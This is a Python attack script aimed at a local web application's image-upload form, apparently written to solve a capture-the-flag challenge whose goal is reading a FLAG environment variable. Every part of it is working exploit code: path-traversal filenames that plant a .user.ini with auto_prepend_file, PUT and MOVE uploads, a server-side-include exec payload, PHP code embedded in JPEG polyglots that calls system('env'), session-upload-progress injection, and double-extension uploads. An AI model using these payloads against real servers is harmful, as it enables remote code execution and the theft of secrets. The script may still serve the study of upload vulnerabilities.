import requests
import re

base_url = "http://127.0.0.1:33021"

# Minimal valid JPEG (just magic bytes)
minimal_jpeg = b'\xff\xd8\xff\xd9'

# Test 1: Try path traversal in filename
print("[*] TEST 1: Path traversal to upload .user.ini")
payloads = [
    # Try to write to parent directory as .user.ini
    ('../.user.ini', minimal_jpeg + b'\nauto_prepend_file=shell.jpg\n'),
    ('../../.user.ini', minimal_jpeg + b'\nauto_prepend_file=shell.jpg\n'),
    ('....//.user.ini', minimal_jpeg + b'\nauto_prepend_file=shell.jpg\n'),
    ('.user.ini/', minimal_jpeg + b'\nauto_prepend_file=shell.jpg\n'),
    ('.user.ini%00', minimal_jpeg + b'\nauto_prepend_file=shell.jpg\n'),
]

for filename, content in payloads:
    files = {'userfile': (filename, content, 'image/jpeg')}
    r = requests.post(f"{base_url}/index.php", files=files)
    print(f"[+] '{filename}': {r.status_code}")
    # Check for .user.ini in various locations
    checks = [
        f"{base_url}/upload/.user.ini",
        f"{base_url}/.user.ini",
        f"{base_url}/upload/../.user.ini",
    ]
    for check_url in checks:
        r2 = requests.get(check_url)
        if r2.status_code == 200:
            print(f"    [!!!] FOUND at {check_url}")
            print(f"    [+] Content: {r2.text}")

# Test 2: Check if we can overwrite via PUT
print("\n[*] TEST 2: Try PUT method to upload .user.ini")
userini_content = 'auto_prepend_file=shell.jpg'
r = requests.put(f"{base_url}/upload/.user.ini", data=userini_content)
print(f"[+] PUT .user.ini: {r.status_code}")

# Test 3: Try to use MOVE method
print("\n[*] TEST 3: Try MOVE method")
# First upload a file
jpeg = minimal_jpeg + b'auto_prepend_file=shell.jpg'
files = {'userfile': ('config.jpg', jpeg, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Upload: {r.status_code}")

# Then try to move it
headers = {'Destination': f'{base_url}/upload/.user.ini'}
r = requests.request('MOVE', f"{base_url}/upload/config.jpg", headers=headers)
print(f"[+] MOVE: {r.status_code}")

# Test 4: Check for SSI (Server Side Includes)
print("\n[*] TEST 4: Try SSI injection")
ssi_payload = minimal_jpeg + b'<!--#exec cmd="env" -->'
files = {'userfile': ('ssi.shtml', ssi_payload, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
match = re.search(r"href='upload/([^']+)'", r.text)
if match:
    filename = match.group(1)
    r2 = requests.get(f"{base_url}/upload/{filename}")
    print(f"[+] SSI file: {filename}")
    print(f"[+] Content: {r2.text}")
    # Try accessing as .shtml
    r3 = requests.get(f"{base_url}/upload/{filename.replace('.jpg', '')}")
    if r3.status_code == 200 and 'PATH=' in r3.text:
        print("[!!!] SSI EXECUTES!")

# Test 5: Try to exploit PHP file upload processing
print("\n[*] TEST 5: PHP session upload progress")
# PHP might store session files with uploaded content
session_payload = b'<?php system("env"); ?>'
files = {'userfile': ('session.jpg', minimal_jpeg + session_payload, 'image/jpeg')}
data = {'PHP_SESSION_UPLOAD_PROGRESS': session_payload}
r = requests.post(f"{base_url}/index.php", files=files, data=data, cookies={'PHPSESSID': 'exploit'})
print(f"[+] Session upload: {r.status_code}")

# Check if session file exists
session_file = requests.get(f"{base_url}/tmp/sess_exploit")
print(f"[+] Session file check: {session_file.status_code}")

# Test 6: Try to find the actual upload mechanism
print("\n[*] TEST 6: Check for alternate execution vectors")
# Maybe there's a cron job processing uploaded files
r = requests.get(f"{base_url}/process.php")
print(f"[+] process.php: {r.status_code}")

r = requests.get(f"{base_url}/cron.php")
print(f"[+] cron.php: {r.status_code}")

# Test 7: Try with alternate extensions
print("\n[*] TEST 7: Alternate extensions")
extensions = ['.php.jpg', '.php5.jpg', '.phtml.jpg', '.inc.jpg', '.phps.jpg']
for ext in extensions:
    files = {'userfile': (f'shell{ext}', minimal_jpeg + b'<?php system("env"); ?>', 'image/jpeg')}
    r = requests.post(f"{base_url}/index.php", files=files)
    match = re.search(r"href='upload/([^']+)'", r.text)
    if match:
        filename = match.group(1)
        r2 = requests.get(f"{base_url}/upload/{filename}")
        # Check if PHP executed (no raw PHP code visible)
        if '<?php' not in r2.text and len(r2.text) > 10:
            print(f"[!!!] {ext} MIGHT EXECUTE!")
            print(f"    Content: {r2.text}")

# Test 8: The key test - check if .user.ini can be placed correctly
print("\n[*] TEST 8: Final .user.ini placement attempt")
# Upload shell.jpg with PHP code
shell_content = minimal_jpeg + b'<?php echo getenv("FLAG"); ?>'
files = {'userfile': ('shell.jpg', shell_content, 'image/jpeg')}
requests.post(f"{base_url}/index.php", files=files)

# Now try to place .user.ini
# Check if there's a way to upload without .jpg extension
# Maybe the server removes .jpg if already present?
files = {'userfile': ('.user.ini', minimal_jpeg + b'\nauto_prepend_file=shell.jpg\n', 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] .user.ini upload: {r.text[:300]}")

# Check for .user.ini
r = requests.get(f"{base_url}/upload/.user.ini")
if r.status_code == 200:
    print("[!!!] .user.ini EXISTS!")
    print(f"[+] Content: {r.text}")
else:
    print(f"[+] .user.ini: {r.status_code}")

